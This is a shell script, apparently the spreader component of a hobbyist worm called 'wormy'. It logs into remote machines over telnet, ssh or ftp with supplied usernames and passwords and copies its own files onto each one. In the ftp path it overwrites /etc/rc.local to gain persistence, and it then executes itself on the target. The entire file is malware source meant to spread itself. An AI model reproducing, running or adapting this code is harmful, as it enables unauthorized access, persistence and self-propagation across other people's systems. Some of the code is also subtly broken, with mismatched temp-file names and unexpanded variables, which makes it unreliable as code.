#!/bin/sh

#/*
 #* .wormys.sh
 #* 
 #* Copyright 2016 DockTownMayor <DockTownMayor@Host>
 #* 
 #* This program is free software; you can redistribute it and/or modify
 #* it under the terms of the GNU General Public License as published by
 #* the Free Software Foundation; either version 2 of the License, or
 #* (at your option) any later version.
 #* 
 #* This program is distributed in the hope that it will be useful,
 #* but WITHOUT ANY WARRANTY; without even the implied warranty of
 #* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 #* GNU General Public License for more details.
 #* 
 #* You should have received a copy of the GNU General Public License
 #* along with this program; if not, write to the Free Software
 #* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 #* MA 02110-1301, USA.
 #* 
 #* 
 #*/

# It wont check if its already infected...that will be so discret when the cpu and ram usage go up...

execST()
{
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -w -i out.fifo -o in.fifo "$" 'exit\n'
	~/.wormye -s -o in.fifo '~/.wormy.sh\n' # n or r?
}

telnetF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid telnet "$4"
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	cp ~/.wormy.sh ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormy.sh\n'
	cp ~/.wormyr ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormyr\n'
	cp ~/.wormys.sh ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormys.sh\n'
	if [ -e "~/.wormy.pyc" ]; then
		cp ~/.wormy.pyc ~/.womryt
		~/.wormye -s -o in.fifo 'echo "'
		~/.wormye -s -i ~/.wormyt -o in.fifo
		~/.wormye -s -o in.fifo '" > ~/.wormy.pyc\n'
	fi
	cp ~/.wormye ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormye\n'
	cp ~/.wormy ~/.womryt
	~/.wormye -s -o in.fifo 'echo "'
	~/.wormye -s -i ~/.wormyt -o in.fifo
	~/.wormye -s -o in.fifo '" > ~/.wormy\n'
	if [ -e "~/.wormyj.class" ]; then
		cp ~/.wormyj.class ~/.womryt
		~/.wormye -s -o in.fifo 'echo "'
		~/.wormye -s -i ~/.wormyt -o in.fifo
		~/.wormye -s -o in.fifo '" > ~/.wormyj.class.sh\n'
	fi
	rm ~/.wormyt
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid telnet "$4"
	execST
}

sshF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ssh "$4"
	~/.wormye -w -i out.fifo -o in.fifo ogin '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -w -i out.fifo -o in.fifo "$" 'exit\n'
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid scp ".wormy*" "$2@$4:~"
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ssh "$4"
	execST
}

ftpF()
{
	~/.wormye -f -i in.fifo -o out.fifo -p .wormye.pid ftp "$4"
	~/.wormye -w -i out.fifo -o in.fifo Name '$2\n'
	~/.wormye -w -i out.fifo -o in.fifo assword '$3\n'
	~/.wormye -s -o in.fifo 'put ~/.wormye ~/.wormye\n'
	~/.wormye -s -o in.fifo 'put ~/.wormyr /etc/rc.local\n'
	~/.wormye -s -o in.fifo 'chmod +x /etc/rc.local'
	~/.wormye -s -o in.fifo 'put ~/.wormyr ~/.wormyr\n'
	~/.wormye -s -o in.fifo 'put ~/.wormy.sh ~/.wormy.sh\n'
	~/.wormye -s -o in.fifo 'put ~/.wormy ~/.wormy\n'
	if [ -e "~/.wormy.pyc" ]; then
		~/.wormye -s -o in.fifo 'put ~/.wormy.pyc ~/.wormy.pyc\n'
	fi
	if [ -e "~/.wormyj.class" ]; then
		~/.wormye -s -o in.fifo 'put ~/.wormyj.class ~/.wormyj.class\n'
	fi
}

case "$1" in
	telnet)
		telnetF
	;;
	ssh)
		sshF
	;;
	ftp)
		ftpF
	;;
esac
